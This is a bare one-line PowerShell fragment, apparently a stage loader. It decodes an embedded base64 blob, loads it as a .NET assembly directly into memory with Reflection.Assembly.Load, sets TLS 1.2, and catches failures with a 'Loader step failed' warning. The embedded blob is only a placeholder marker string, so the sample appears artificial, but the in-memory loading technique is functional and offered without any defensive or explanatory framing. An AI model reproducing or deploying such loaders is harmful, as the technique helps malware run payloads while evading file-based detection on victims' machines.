
try { $PayloadBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjo4OHJ3Mncya2tr"); Write-Verbose ("Assembly bytes: " + $PayloadBytes.Length); [Reflection.Assembly]::Load($PayloadBytes); [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { Write-Warning "Loader step failed" }
